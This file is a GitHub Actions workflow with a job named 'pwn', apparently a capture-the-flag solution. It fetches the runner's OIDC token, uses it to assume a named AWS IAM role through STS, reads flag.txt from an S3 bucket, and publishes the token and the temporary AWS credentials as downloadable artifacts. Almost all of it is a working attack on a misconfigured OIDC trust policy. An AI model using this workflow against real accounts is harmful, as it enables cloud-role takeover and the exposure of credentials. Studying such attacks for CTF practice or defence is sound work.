name: Get Flag (no uses)
on:
  workflow_dispatch:
  push:
    branches: [ main ]
    paths:
      - .github/workflows/get-flag-no-uses.yml

permissions:
  contents: read
  id-token: write

jobs:
  pwn:
    runs-on: ubuntu-latest
    steps:
      - name: Sanity
        run: |
          echo "Hello from runner"
          uname -a

      - name: Request OIDC (no heredoc / no jq)
        shell: bash
        run: |
          set -euo pipefail
          test -n "${ACTIONS_ID_TOKEN_REQUEST_URL-}" || { echo "[!] missing URL"; exit 1; }
          test -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN-}" || { echo "[!] missing TOKEN"; exit 1; }
          RESP="$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
                 "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")"
          printf "%s" "$RESP" > oidc_response.json
          python3 - "$PWD/oidc_response.json" <<'PY'
import json,sys,base64
p=sys.argv[1]
data=json.load(open(p))
tok=data.get("value","")
open("idtoken.jwt","w").write(tok)
h,p,_=tok.split(".")
def b64d(s): s+="="*(-len(s)%4); return base64.urlsafe_b64decode(s)
pl=json.loads(b64d(p))
open("payload.json","w").write(json.dumps(pl,indent=2))
print("sub:",pl.get("sub"))
print("repository:",pl.get("repository"))
print("ref:",pl.get("ref"))
print("aud:",pl.get("aud"))
PY
          echo "== payload head =="
          sed -n '1,80p' payload.json || true

      - name: Upload artifacts (always)
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: oidc-artifacts
          if-no-files-found: ignore
          path: |
            oidc_response.json
            idtoken.jwt
            payload.json

      - name: Try AWS STS AssumeRoleWithWebIdentity (best-effort)
        shell: bash
        run: |
          set -euo pipefail
          ROLE="arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875"
          aws --version || true
          aws sts get-caller-identity || true
          aws sts assume-role-with-web-identity \
            --role-arn "$ROLE" \
            --role-session-name "GHA-NoUses-${{ github.run_id }}" \
            --web-identity-token "file://idtoken.jwt" \
            --duration-seconds 900 \
            --output json > creds.json || true
          head -c 600 creds.json; echo
          # export creds (ignore if jq missing)
          export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' < creds.json 2>/dev/null || echo)
          export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' < creds.json 2>/dev/null || echo)
          export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' < creds.json 2>/dev/null || echo)
          echo "AKID=${AWS_ACCESS_KEY_ID:0:4}..."

      - name: Try read flag.txt
        shell: bash
        run: |
          set -euo pipefail
          aws s3 cp s3://oh-i-really-do-care/flag.txt ./real_flag.txt || true
          echo "---- BEGIN FLAG ----"
          sed -n '1,200p' real_flag.txt || true
          echo "-----  END FLAG  -----"

      - name: Upload creds (always)
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: oidc-artifacts
          if-no-files-found: ignore
          path: |
            creds.json
